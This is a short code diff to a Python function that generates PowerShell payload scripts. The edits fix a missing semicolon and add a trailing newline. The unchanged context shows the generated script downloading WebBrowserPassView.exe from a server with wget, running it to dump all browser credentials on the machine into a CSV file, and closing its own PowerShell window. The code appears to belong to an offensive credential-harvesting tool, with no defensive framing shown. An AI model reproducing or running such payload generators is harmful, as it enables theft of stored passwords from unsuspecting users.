@@ -148,7 +148,7 @@ def generate_script(generation_type, payload, api_key):
             script_contents += 'cd /;'
 
         # Downloaded developer copy of WebBrowserPassView
-        script_contents += 'wget ' + url + '/static/downloads/WebBrowserPassView.exe -OutFile WebBrowserPassView.exe'
+        script_contents += 'wget ' + url + '/static/downloads/WebBrowserPassView.exe -OutFile WebBrowserPassView.exe;'
 
         # Generate CSV containing all credentials on the system.
         script_contents += '.\\WebBrowserPassView.exe /scomma credentials.csv;'
@@ -283,6 +283,6 @@ def generate_script(generation_type, payload, api_key):
     )
 
     # Close PowerShell Window
-    script_contents += "stop-process -Id $PID\r\n"
+    script_contents += "stop-process -Id $PID\r\n\r\n"
 
     return script_contents
